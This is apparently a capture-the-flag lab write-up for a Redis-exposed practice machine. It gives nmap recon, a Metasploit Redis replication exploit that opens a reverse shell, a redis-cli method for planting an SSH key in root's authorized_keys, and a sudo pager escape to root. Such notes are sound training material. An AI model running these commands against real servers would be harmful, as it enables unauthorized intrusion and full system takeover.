
IP: 192.168.196.176

---

## Recon

```bash
nmap -sV -sC -p- 192.168.196.176
```

Output:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
6379/tcp open  redis   Redis key-value store 4.0.14
```

Two ports — SSH and Redis. Redis is unauthenticated and running as a privileged user, which is a known misconfiguration.

---

## Initial Access — Redis RCE

**Vulnerability:** Redis 4.x/5.x allows loading external `.so` files as modules. If Redis is unauthenticated, an attacker can make the target replicate from a rogue Redis server and deliver a malicious module that gives command execution.

**Reference:** Exploit-DB 48272 — Redis Replication Code Execution

**Tool used:** Metasploit `exploit/linux/redis/redis_replication_cmd_exec`

```
use exploit/linux/redis/redis_replication_cmd_exec
set RHOSTS 192.168.196.176
set LHOST <tun0_ip>
set SRVHOST <tun0_ip>
run
```

> **Note on SRVHOST:** Must be set to your tun0 IP explicitly. The exploit spins up a rogue Redis master on your machine — the target connects to it during replication to pull down the malicious `.so`. If left as `0.0.0.0` the exploit fails because the target won't know where to connect.

Got a Meterpreter session as `prudence`.

**What the exploit does under the hood:**
1. Connects to Redis unauthenticated
2. Sends `SLAVEOF` command — makes target replicate from your rogue server
3. Rogue server delivers malicious `.so` during replication
4. Runs `MODULE LOAD` to load it
5. Triggers the payload → reverse shell

**Manual equivalent (without Metasploit):**
- Clone `redis-rce` from GitHub
- Need compiled `exp.so` from `RedisModules-ExecuteCommand` (uses `system.exec` command name)
- Metasploit's bundled `exp.so` at `/usr/share/metasploit-framework/data/exploits/redis/exp/exp.so` uses `shell.exec` — incompatible with `redis-rce.py`

**Alternative manual method (no tools needed — just redis-cli):**
Write your SSH public key directly into `/root/.ssh/authorized_keys` via Redis file write:
```bash
ssh-keygen -t rsa -f redis_key
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt
cat key.txt | redis-cli -h <target> -x set pwn
redis-cli -h <target> config set dir /root/.ssh
redis-cli -h <target> config set dbfilename authorized_keys
redis-cli -h <target> save
ssh -i redis_key root@<target>
```
Works because Redis is unauthenticated and running as root.

---

## Privilege Escalation

Dropped into shell from Meterpreter:
```
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Checked sudo permissions:
```bash
sudo -l
```

Output:
```
User prudence may run the following commands on blackgate:
    (root) NOPASSWD: /usr/local/bin/redis-status
```

**Investigated the binary:**
```bash
cat /usr/local/bin/redis-status
```

Even though it's a compiled binary, strings are stored in plaintext inside it. Found two things:
- Hardcoded auth key: `ClimbingParrotKickingDonkey321`
- It calls: `/usr/bin/systemctl status redis`

**The privesc chain:**
1. Run the binary as root: `sudo /usr/local/bin/redis-status`
2. Enter the hardcoded key when prompted
3. `systemctl status` opens output in a pager (`less`) — which runs with root privileges
4. From inside `less`, type `!sh` to spawn a shell
5. Shell spawns as root

> **Key concept — pager escape:** Any privileged process that opens `less` or another pager can be escaped with `!<command>`. The spawned shell inherits the privileges of the parent process. This is documented on GTFOBins under `less`.

---

## Flags

```bash
cat /root/proof.txt
cat /home/prudence/local.txt
```

---

## Key Takeaways

- Always check for unauthenticated Redis — default installs have no auth
- `strings` on a compiled binary often reveals hardcoded credentials
- `sudo -l` is always the first privesc check after getting a shell
- Pager escapes (`!sh` in `less`) are a common OSCP privesc technique
- Searchsploit finds raw exploit code; Metasploit `search` finds ready-to-run modules — both search different databases

---

## Related Notes

- [[Port-Overview-and-Priorities]]
- [[Linux_Common_Commands]]
- [[Linux_Priv_Esc]]
- [[SearchSploit]]
